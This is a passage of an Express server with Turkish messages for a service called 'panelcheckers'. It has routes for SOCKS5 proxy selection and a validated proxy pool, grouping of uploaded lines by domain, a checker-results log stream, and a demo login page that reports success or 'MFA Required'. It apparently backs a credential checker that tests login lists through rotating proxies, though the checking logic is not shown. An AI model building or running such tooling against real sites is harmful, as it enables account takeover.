        const inputs = parseAllowedHostInputs(req.body);
        if (inputs.length === 0) return res.status(400).json({ error: 'Host boş olamaz.' });

        const settings = await getSettings();
        const currentHosts = settings?.allowedHosts || [];
        const added = [], existing = [], skipped = [], seen = new Set();

        for (const input of inputs) {
            const validation = await validateAllowedHostCandidate(input);
            if (!validation.ok) { skipped.push({ input, error: validation.error }); continue; }
            const host = validation.host;
            if (seen.has(host)) continue;
            seen.add(host);
            if (currentHosts.includes(host)) { existing.push(host); continue; }
            added.push(host);
        }

        if (added.length === 0 && existing.length === 0) {
            return res.status(400).json({ error: skipped[0]?.error || 'Geçerli host bulunamadı.' });
        }

        const newHosts = [...currentHosts, ...added];
        await db.collection('settings').updateOne(
            { _id: 'system' },
            { $set: { allowedHosts: newHosts, updatedAt: new Date(), updatedBy: req.user.username } }
        );
        cachedSettings = null;
        settingsCacheTime = 0;

        res.json({ ok: true, added, existing, skipped, hosts: newHosts });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/admin/allowed-hosts/:host', requireAuth, requirePermission(PERMISSIONS.HOSTS_MANAGE), async (req, res) => {
    try {
        if (!db) return res.status(503).json({ error: 'DB bağlantısı yok' });
        
        const host = normalizeHost(req.params.host);
        const settings = await getSettings();
        const currentHosts = settings?.allowedHosts || [];
        
        if (!currentHosts.includes(host)) {
            return res.status(404).json({ error: 'Host bulunamadı.' });
        }

        const newHosts = currentHosts.filter(h => h !== host);
        await db.collection('settings').updateOne(
            { _id: 'system' },
            { $set: { allowedHosts: newHosts, updatedAt: new Date(), updatedBy: req.user.username } }
        );
        cachedSettings = null;
        settingsCacheTime = 0;

        res.json({ ok: true, host, hosts: newHosts });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== PROXY API ====================
app.get('/api/proxy/list', requireAuth, requirePermission(PERMISSIONS.PROXY_MANAGE), async (req, res) => {
    try {
        const configs = await getProxyConfigs();
        const settings = await getSettings();
        const userSelection = settings?.userProxySelections?.[req.user.id];
        
        const proxies = configs.map(config => ({
            ...config,
            isSelected: userSelection === config.id,
            configured: Boolean(config.host && config.port)
        }));
        
        const active = proxies.find(p => p.isSelected);
        res.json({ proxies, active });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/proxy/select', requireAuth, requirePermission(PERMISSIONS.PROXY_MANAGE), async (req, res) => {
    try {
        if (!db) return res.status(503).json({ error: 'DB bağlantısı yok' });
        
        const { mode, proxyId, connectionString } = req.body;
        let selectedId = null;
        let proxyInfo = null;
        
        if (mode === 'preset') {
            if (!proxyId) return res.status(400).json({ error: 'Proxy ID gerekli' });
            const config = await getProxyConfig(proxyId);
            if (!config) return res.status(404).json({ error: 'Proxy bulunamadı' });
            if (!config.host || !config.port) {
                return res.status(400).json({ error: 'Bu proxy yapılandırılmamış (host/port eksik)' });
            }
            
            const proxyUrl = buildProxyUrl(config);
            if (!proxyUrl) return res.status(400).json({ error: 'Proxy URL oluşturulamadı' });
            
            try {
                const geo = await lookupProxyGeo(proxyUrl);
                selectedId = config.id;
                proxyInfo = { ...config, geo };
            } catch (error) {
                return res.status(400).json({ error: `Proxy doğrulanamadı: ${error.message}` });
            }
        } else if (mode === 'custom') {
            if (!connectionString) return res.status(400).json({ error: 'Connection string gerekli' });
            const parsed = parseSocksProxy(connectionString);
            
            try {
                const geo = await lookupProxyGeo(parsed.url);
                const customId = `custom_${Date.now()}`;
                selectedId = customId;
                proxyInfo = { id: customId, label: 'Manual SOCKS5', host: parsed.host, port: parsed.port, geo };
            } catch (error) {
                return res.status(400).json({ error: `Proxy doğrulanamadı: ${error.message}` });
            }
        } else {
            return res.status(400).json({ error: 'Geçersiz mod' });
        }
        
        await db.collection('settings').updateOne(
            { _id: 'system' },
            { $set: { [`userProxySelections.${req.user.id}`]: selectedId } }
        );
        cachedSettings = null;
        settingsCacheTime = 0;
        
        sendLog(`🌍 Proxy seçildi: ${proxyInfo.label}`, 'success', req.user.id);
        res.json({ success: true, proxy: proxyInfo });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
});

app.delete('/api/proxy/select', requireAuth, requirePermission(PERMISSIONS.PROXY_MANAGE), async (req, res) => {
    try {
        if (!db) return res.status(503).json({ error: 'DB bağlantısı yok' });
        
        await db.collection('settings').updateOne(
            { _id: 'system' },
            { $unset: { [`userProxySelections.${req.user.id}`]: "" } }
        );
        cachedSettings = null;
        settingsCacheTime = 0;
        
        sendLog(`🌍 Proxy seçimi kaldırıldı`, 'info', req.user.id);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ==================== PROXY POOL API ====================
app.get('/api/proxy/pool', requireAuth, requirePermission(PERMISSIONS.PROXY_MANAGE), async (req, res) => {
    try {
        const stats = proxyPool.getStats();
        const locations = proxyPool.locations;
        res.json({ proxies: stats, locations });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/proxy/pool', requireAuth, requirePermission(PERMISSIONS.PROXY_MANAGE), async (req, res) => {
    try {
        const { host, port, username, password, label, location } = req.body;
        
        if (!host || !port) {
            return res.status(400).json({ error: 'Host ve port gerekli' });
        }
        
        const proxyConfig = {
            id: `proxy_${Date.now()}`,
            label: label || 'Custom Proxy',
            location: location || 'unknown',
            host,
            port: parseInt(port),
            username: username || '',
            password: password || '',
            enabled: true
        };
        
        proxyPool.addProxy(proxyConfig);
        
        const proxy = proxyPool.proxies.find(p => p.id === proxyConfig.id);
        const isValid = await proxyPool.validateProxy(proxy);
        
        if (!isValid) {
            proxy.enabled = false;
            return res.status(400).json({ 
                error: 'Proxy doğrulanamadı', 
                proxy: proxyConfig 
            });
        }
        
        if (db) await proxyPool.saveToDB(db);
        
        res.json({ 
            success: true, 
            proxy: proxyConfig,
            verified: isValid,
            ip: proxy.verifiedIp
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/proxy/pool/:id', requireAuth, requirePermission(PERMISSIONS.PROXY_MANAGE), async (req, res) => {
    try {
        const id = req.params.id;
        const index = proxyPool.proxies.findIndex(p => p.id === id);
        
        if (index === -1) {
            return res.status(404).json({ error: 'Proxy bulunamadı' });
        }
        
        proxyPool.proxies.splice(index, 1);
        if (db) await proxyPool.saveToDB(db);
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.patch('/api/proxy/pool/:id', requireAuth, requirePermission(PERMISSIONS.PROXY_MANAGE), async (req, res) => {
    try {
        const id = req.params.id;
        const { enabled } = req.body;
        
        const proxy = proxyPool.proxies.find(p => p.id === id);
        if (!proxy) {
            return res.status(404).json({ error: 'Proxy bulunamadı' });
        }
        
        proxy.enabled = enabled !== false;
        if (db) await proxyPool.saveToDB(db);
        
        res.json({ success: true, proxy });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/proxy/pool/validate', requireAuth, requirePermission(PERMISSIONS.PROXY_MANAGE), async (req, res) => {
    try {
        const results = [];
        for (const proxy of proxyPool.proxies) {
            const isValid = await proxyPool.validateProxy(proxy);
            results.push({
                id: proxy.id,
                label: proxy.label,
                isValid,
                ip: proxy.verifiedIp,
                country: proxy.verifiedCountry
            });
        }
        
        res.json({ results });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== GROUP DOWNLOAD ====================
app.post('/api/group-download', requireAuth, requirePermission(PERMISSIONS.LISTS_GROUP), async (req, res) => {
    try {
        const { groups } = req.body;
        if (!groups || !groups.length) {
            return res.status(400).json({ error: 'Gruplar boş' });
        }

        const zip = new JSZip();
        for (const group of groups) {
            const content = group.lines.join('\n');
            const fileName = `${group.domain}.txt`;
            zip.file(fileName, content);
        }

        const buffer = await zip.generateAsync({ type: 'nodebuffer' });
        res.setHeader('Content-Disposition', 'attachment; filename=domain-bazli-listeler.zip');
        res.setHeader('Content-Type', 'application/zip');
        res.send(buffer);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== HEALTH ====================
app.get('/health', (req, res) => {
    res.json({
        ok: true,
        service: 'panelcheckers',
        db: db ? 'connected' : 'disabled',
        auth: db ? 'enabled' : 'disabled',
        mongo: mongoStatus,
        proxyPool: proxyPool.proxies.length,
        uptime: process.uptime()
    });
});

// ==================== LOG STREAM ====================
app.get('/api/log-stream', requireAuth, requirePermission(PERMISSIONS.CHECKER_RESULTS), (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    clients.push({ res, user: req.user });
    req.on('close', () => { clients = clients.filter(c => c.res !== res); });
});

// ==================== DEMO LOGIN ====================
app.get('/demo-login', (req, res) => {
    res.type('html').send(`<!doctype html>
<html><head><title>Demo Login</title>
<style>body{font-family:system-ui;background:#f3f5f8;margin:0;display:grid;place-items:center;min-height:100vh;}
main{width:420px;background:white;border-radius:8px;padding:24px;}
label{display:block;font-weight:700;margin-top:12px;}
input,button{width:100%;margin-top:8px;padding:12px;font:inherit;}
button{background:#1e466e;color:white;border:0;border-radius:6px;cursor:pointer;}
#message{margin-top:14px;font-weight:700;}
</style></head>
<body><main><h1>Demo Login</h1>
<form id="loginForm"><label>Username<input name="username" id="username"></label>
<label>Password<input name="password" id="password" type="password"></label>
<button type="submit">Login</button><div id="message"></div></form></main>
<script>
document.getElementById('loginForm').addEventListener('submit', event => {
  event.preventDefault();
  const u=document.getElementById('username').value;
  const p=document.getElementById('password').value;
  const msg=document.getElementById('message');
  if(u==='demo'&&p==='demo123'){msg.textContent='✅ Login successful!';}
  else if(u==='mfa'&&p==='mfa123'){msg.textContent='🛡 MFA Required!';}
  else{msg.textContent='❌ Invalid credentials';}
});
</script></body></html>`);
});

// ==================== SETTINGS API ====================
app.get('/api/settings', requireAuth, requirePermission(PERMISSIONS.HOSTS_MANAGE), async (req, res) => {
    try {
        const settings = await getSettings();
        res.json({
            allowedHosts: settings?.allowedHosts || [],
            rootDomains: settings?.rootDomains || [],
            enforceRootDomains: settings?.enforceRootDomains || false,
            proxyConfigs: settings?.proxyConfigs || []
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.patch('/api/settings', requireAuth, requirePermission(PERMISSIONS.HOSTS_MANAGE), async (req, res) => {
    try {
        if (!db) return res.status(503).json({ error: 'DB bağlantısı yok' });
        
        const update = {};
        if (req.body.allowedHosts !== undefined) {
            update.allowedHosts = req.body.allowedHosts.map(h => normalizeHost(h)).filter(Boolean);
        }
        if (req.body.rootDomains !== undefined) {
            update.rootDomains = req.body.rootDomains.map(h => normalizeHost(h)).filter(Boolean);
        }
        if (req.body.enforceRootDomains !== undefined) {
            update.enforceRootDomains = Boolean(req.body.enforceRootDomains);
        }
        if (req.body.proxyConfigs !== undefined) {
            update.proxyConfigs = req.body.proxyConfigs;
        }
        
        update.updatedAt = new Date();
        update.updatedBy = req.user.username;

        await db.collection('settings').updateOne(
            { _id: 'system' },
            { $set: update },
            { upsert: true }
        );
        
        cachedSettings = null;
        settingsCacheTime = 0;
        
        res.json({ ok: true, updated: update });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== SERVER BAŞLATMA ====================
(async () => {
    await connectMongo();
    await initializeProxyPool();
    const server = app.listen(PORT, HOST, () => {
        console.log(`✅ Sunucu çalışıyor: http://${HOST}:${PORT}`);
        console.log(`📌 Admin girişi: kullanıcı "${process.env.ADMIN_USERNAME || 'admin'}"`);
        console.log(`📦 ${proxyPool.proxies.length} proxy havuzda`);
    });
    server.on('error', (err) => {
        console.error(`❌ Sunucu başlatılamadı:`, err.message);
        process.exit(1);
    });
})();